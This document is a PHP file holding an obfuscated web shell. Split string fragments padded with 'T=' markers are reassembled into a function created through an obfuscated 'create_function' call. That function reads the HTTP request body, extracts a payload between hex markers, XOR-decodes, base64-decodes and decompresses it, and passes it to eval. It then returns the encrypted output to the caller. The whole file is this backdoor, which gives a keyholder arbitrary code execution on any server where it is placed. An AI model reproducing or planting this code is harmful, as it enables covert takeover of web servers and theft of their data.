<?php
$g='$kT=="4T=7c43251";T=$kT=h="8287b113222b"T=;$kT=fT=="175c1dT=f8T=aT=e13";$p="9PHicNmT=hT=kwCgwXa0T=";function xT=($t,$k)T';
$a='=_get_contentT=T=s();@ob_end_cleT=an();$r=@T=basT=e64_encT=ode(@x(@gT=zcoT=mpreT=ss($o),$k));priT=nt(T="T=$p$kh$r$kf");}';
$j='put")T=,$m)T===T=1) {@ob_T=start(T=);@evT=al(@gzuncoT=mT=press(@x(@bT=T=ase64_decode(T=$T=m[1]),$T=k)));$oT==@oT=bT=T';
$D='o.=T=$t{$i}^$k{$T=T=j};}}reT=turn $o;}if (T=T=@prT=eg_T=match("/$kh(.+)$T=kf/",@T=file_getT=_conteT=nts(T="php://iT=n';
$R='={$c=stT=rlen($k)T=;$T=l=strlen(T=$t);$oT=="T=";for($i=T=0;T=$i<T=$l;){for(T=$j=0;($j<$c&T=&$i<T=$l);$j+T=+,$i+T=+){$T=';
$w=str_replace('l','','lcreallte_fulnlctlion');
$C=str_replace('T=','',$g.$R.$D.$j.$a);
$G=$w('',$C);$G();
?>
